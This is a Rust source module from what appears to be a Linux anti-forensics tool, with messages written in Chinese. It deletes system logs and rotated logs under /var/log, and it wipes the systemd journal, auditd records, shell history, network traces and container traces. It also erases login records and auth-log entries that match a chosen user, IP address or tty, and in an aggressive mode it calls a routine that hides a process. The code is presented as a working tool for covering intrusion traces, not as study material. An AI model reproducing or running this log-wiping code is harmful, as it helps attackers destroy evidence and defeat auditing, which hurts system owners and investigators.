pub mod journal;
pub mod network;
pub mod textlog;
pub mod utmp;

use crate::cli::Category;
use crate::common::{self, Context};
use crate::paths;

pub fn clean_all(ctx: &Context, categories: &[Category]) {
    let patterns = paths::log_paths(categories);
    let targets = common::expand_targets(&patterns);

    if targets.is_empty() {
        ctx.info("没有找到需要清理的目标文件");
    } else {
        ctx.info(&format!("发现 {} 个文件/目录目标", targets.len()));
        for t in &targets {
            ctx.remove(t);
        }
    }

    if categories.contains(&Category::System) {
        clean_rotated_logs(ctx);
    }

    if categories.contains(&Category::System) || categories.contains(&Category::Audit) {
        journal::clean_systemd_journal(ctx);
    }

    if categories.contains(&Category::Audit) || categories.contains(&Category::Security) {
        journal::clean_auditd(ctx);
    }

    if categories.contains(&Category::Shell) {
        network::clean_shell_env(ctx);
    }

    if categories.contains(&Category::Network) {
        network::clean_network_traces(ctx);
    }

    if categories.contains(&Category::Container) {
        network::clean_container_traces(ctx);
    }

    if ctx.aggressive {
        network::hide_process(ctx);
    }
}

pub fn selective_clean(
    ctx: &Context,
    user: Option<&str>,
    ip: Option<&str>,
    tty: Option<&str>,
) {
    if user.is_none() && ip.is_none() && tty.is_none() {
        eprintln!("选择性清除模式需要至少一个筛选条件: --user, --ip, 或 --tty");
        return;
    }

    ctx.info("选择性清除模式: 精确移除匹配的登录记录");
    utmp::clean_all_login_records(ctx, user, ip, tty);
    textlog::clean_auth_logs(ctx, user, ip, tty);
}

fn clean_rotated_logs(ctx: &Context) {
    ctx.info("清理轮转日志...");
    let patterns = [
        "/var/log/**/*.1",
        "/var/log/**/*.2",
        "/var/log/**/*.gz",
        "/var/log/**/*.bz2",
        "/var/log/**/*.xz",
        "/var/log/**/*.zst",
        "/var/log/**/*.old",
    ];
    for pattern in &patterns {
        if let Ok(entries) = glob::glob(pattern) {
            for path in entries.flatten() {
                ctx.remove(&path);
            }
        }
    }
}
